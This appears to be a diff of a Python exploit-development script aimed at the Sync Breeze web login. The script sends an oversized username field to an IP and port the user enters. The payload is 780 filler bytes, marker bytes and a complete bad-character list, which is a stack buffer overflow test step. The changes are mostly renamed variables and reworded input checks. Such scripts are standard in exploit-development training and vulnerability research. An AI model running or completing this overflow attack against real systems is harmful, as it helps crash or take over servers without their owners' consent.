@@ -1,28 +1,31 @@
 #!/usr/bin/python3
-#\x00\x0a\x0d\x25\x26\x3d\2b
+
 
 import sys,socket
-from time import sleep
+import time
 
+print("*****Sync-Breeze*****")
 ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
+port=input("Enter the port number\n")
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
-        print("port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*50)
+        print("Port number field is empty")
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*50)
         print("IP address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*50)
         print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*50)
         print("Issues with the user input")
 
-elif (len(ip_address)>0) or (len(port_number)>0):
+
+elif (len(ip_address)>0) and (len(port)>0):
+    print("*"*50)
     badchars = (
   b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -41,11 +44,11 @@ elif (len(ip_address)>0) or (len(port_number)>0):
   b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
   b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
+    size=b"A"* 780 + b"B"*4 + b"C"*4 + badchars 
 
-
-    size=b"A" * 780 + b"B" * 4 + b"C" * 4 + badchars
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address, int(port_number)))
+    s.connect((ip_address,int(port)))
+
     buff=b"username=" + size + b"&password=A"
 
 
@@ -56,7 +59,7 @@ elif (len(ip_address)>0) or (len(port_number)>0):
     buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
     buffer+=b"Accept-Encoding: gzip, deflate\r\n"
     buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
-    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8')+ b"\r\n"
+    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8') + b"\r\n"
     buffer+=b"Origin: http://192.168.100.215\r\n"
     buffer+=b"Connection: keep-alive\r\n"
     buffer+=b"Referer: http://192.168.100.215/login\r\n"
@@ -64,4 +67,3 @@ elif (len(ip_address)>0) or (len(port_number)>0):
 
     buffer=buffer+buff
     s.send((buffer))
-    s.close()
